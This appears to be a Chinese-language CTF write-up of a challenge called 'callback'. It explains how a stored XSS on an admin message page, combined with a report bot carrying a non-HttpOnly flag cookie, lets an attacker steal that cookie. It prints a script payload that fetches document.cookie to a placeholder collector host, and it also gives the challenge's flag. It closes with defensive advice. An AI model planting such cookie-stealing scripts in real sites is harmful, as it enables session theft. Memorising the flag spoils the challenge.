# callback

## 题目简述

用户留言被保存后，在管理员消息页用未转义方式渲染。report 接口会让已登录管理员机器人访问任意非 javascript URL，且机器人随后设置的 flag cookie 不带 HttpOnly。攻击者可制造存储型 XSS，再让机器人访问对应消息页以窃取 cookie。

## 解题过程

选择固定 name，提交包含脚本的 message：

~~~html
<script>
fetch("https://COLLECTOR/?c=" + encodeURIComponent(document.cookie))
</script>
~~~

消息键为 sha1(name)。管理员面板读取指定留言的路径是：

~~~text
/admin-panel?key=<sha1(name)>
~~~

向 /report 提交该完整同源 URL。机器人先用内置账号登录，再设置 flag cookie 并访问消息页；存储脚本在目标源执行，把 cookie 发到受控接收端。收到的值中包含：

~~~text
maple{un54f3_cl13n7_51d3_r357r1c710n5}
~~~

## 方法总结

只禁止 javascript: URL 不能阻止同源存储型 XSS。机器人访问功能必须限制目的地址、使用隔离域，并把敏感 cookie 设置为 HttpOnly。WP 中无需保留一次性的 webhook URL，只要说明接收端用途和完整数据流即可复现。
